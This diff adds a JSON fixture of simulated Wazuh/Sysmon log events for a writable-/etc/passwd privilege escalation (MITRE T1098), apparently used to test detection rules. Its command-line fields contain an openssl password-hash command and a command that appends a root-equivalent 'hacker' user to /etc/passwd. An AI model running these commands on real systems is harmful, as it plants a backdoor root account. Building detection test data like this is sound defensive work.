@@ -1,0 +1,138 @@
+{
+  "_metadata": {
+    "attack_id": "T1098",
+    "variation": "001",
+    "name": "Writable /etc/passwd Privilege Escalation",
+    "description": "Directly appending a root-equivalent user entry to /etc/passwd when the file has weak permissions",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "privilege-escalation",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Generating password hash with openssl for /etc/passwd injection",
+      "sequence": 1,
+      "timestamp": "2026-02-22T03:00:00.800Z",
+      "log": {
+        "timestamp": "2026-02-22T03:00:00.800+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Generating password hash with openssl for account creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1098"
+            ],
+            "tactic": [
+              "Persistence",
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "Account Manipulation"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708567200.000009",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-22 03:00:00.800",
+            "processGuid": "{a1b2c3d4-0005-0001-0001-000000000001}",
+            "processId": "31040",
+            "image": "/usr/bin/openssl",
+            "commandLine": "openssl passwd -1 -salt hacker hacker",
+            "currentDirectory": "/home/admin2",
+            "user": "admin2",
+            "integrityLevel": "no_level",
+            "hashes": "SHA256=19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7",
+            "parentProcessGuid": "{a1b2c3d4-0005-0001-0001-000000000000}",
+            "parentProcessId": "31039",
+            "parentImage": "/usr/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Appending root-equivalent user to /etc/passwd",
+      "sequence": 2,
+      "timestamp": "2026-02-22T03:00:00.900Z",
+      "log": {
+        "timestamp": "2026-02-22T03:00:00.900+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Appending root-equivalent user entry to /etc/passwd",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1098"
+            ],
+            "tactic": [
+              "Persistence",
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "Account Manipulation"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1708567200.000010",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-22 03:00:00.900",
+            "processGuid": "{a1b2c3d4-0005-0001-0001-000000000002}",
+            "processId": "31041",
+            "image": "/usr/bin/bash",
+            "commandLine": "bash -c echo 'hacker:$1$hacker$HASH:0:0::/root:/bin/bash' >> /etc/passwd",
+            "currentDirectory": "/home/admin2",
+            "user": "admin2",
+            "integrityLevel": "no_level",
+            "hashes": "SHA256=a684b296e4fdc16f89c7cfbd2f06dece9ad3e47ce0a6ddb8e7e19aefdc2f5226",
+            "parentProcessGuid": "{a1b2c3d4-0005-0001-0001-000000000000}",
+            "parentProcessId": "31039",
+            "parentImage": "/usr/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        }
+      }
+    }
+  ]
+}
